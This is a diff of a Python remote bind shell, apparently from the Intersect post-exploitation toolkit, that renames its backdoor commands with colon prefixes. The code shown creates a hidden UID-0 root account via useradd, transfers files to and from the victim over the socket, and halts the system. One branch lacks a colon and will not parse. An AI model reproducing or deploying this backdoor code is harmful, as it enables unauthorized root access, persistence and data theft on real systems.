@@ -37,13 +37,13 @@ def bshell():
                 conn.send("[!] Directory does not exist") 
                 conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
-        elif cmd.startswith('adduser'):
+        elif cmd.startswith(':addroot'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send("[+] Root account " + acct + " has been created.") 
 
-        elif cmd.startswith('upload'):
+        elif cmd.startswith(':upload'):
             getname = cmd.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
@@ -56,7 +56,7 @@ def bshell():
             if not os.path.isfile(filename):
                 conn.send("[!] File upload failed! Please try again")
 
-        elif cmd.startswith('download'):
+        elif cmd.startswith(':download'):
             getname = cmd.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
@@ -67,26 +67,18 @@ def bshell():
             else:
                 conn.send("[+] File not found!")
 
-        elif cmd.startswith("rebootsys"):
+        elif cmd.startswith(":reboot"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
 
-        elif cmd == ("exec"):
+        elif cmd == (":mods"):
             conn.send(str(modList))
             conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
         elif cmd.startswith(":exec")
             pass
-            #getname = cmd.split(" ")
-            #modname = getname[1]
-            #if modname in modList is False:
-            #    conn.send("[!] Module not loaded!")
-            #else:
-            #    conn.send("[+] Executing %s " % modname)
-            #    execmod = modname+"()"
-            #    execmod
 
-        elif cmd == ('killme'):
+        elif cmd == (':killme'):
             conn.send("[!] Shutting down shell!\n")
             conn.close()
             sys.exit(0)
